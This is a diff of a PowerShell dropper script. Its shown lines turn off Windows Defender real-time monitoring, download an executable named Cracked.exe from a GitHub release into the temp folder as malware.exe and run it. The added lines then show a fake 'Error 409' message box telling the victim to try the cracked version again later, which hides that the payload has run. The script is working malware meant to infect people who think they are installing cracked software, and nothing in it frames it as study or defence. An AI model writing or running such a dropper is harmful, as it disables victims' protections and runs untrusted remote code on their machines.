@@ -3,3 +3,16 @@ Set-MpPreference -DisableRealtimeMonitoring
 $client = New-Object System.Net.WebClient
 $client.DownloadFile("https://github.com/enterkness-netizen/cracked-gg.github.io/releases/download/NewTom/Cracked.exe", "$env:TEMP\malware.exe")
 Start-Process "$env:TEMP\malware.exe"
+
+# error409_popup.ps1
+
+# Add Windows Forms assembly for the popup
+Add-Type -AssemblyName System.Windows.Forms
+
+# Show the popup with custom title and message
+[System.Windows.Forms.MessageBox]::Show(
+    "Try installing the cracked version again later!",  # Message text
+    "Error 409",                                       # Title of the popup
+    [System.Windows.Forms.MessageBoxButtons]::OK, 
+    [System.Windows.Forms.MessageBoxIcon]::Error
+)
